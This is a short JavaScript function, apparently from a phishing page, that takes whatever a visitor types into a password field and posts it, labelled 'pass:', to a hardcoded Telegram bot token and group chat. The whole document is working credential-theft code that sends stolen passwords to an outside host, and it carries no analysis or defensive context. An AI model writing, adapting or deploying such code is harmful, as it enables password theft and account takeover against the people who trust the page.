function sendMessage() {

    var pass = document.getElementById('pass');

    var gabungan = 'pass%3A%0A' + pass.value;

    var token = '7502188086:AAEr-hPf1vs0wRDiI69OoAbPTDKkMINz_6s';
    var grup = '-1002313585294';

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}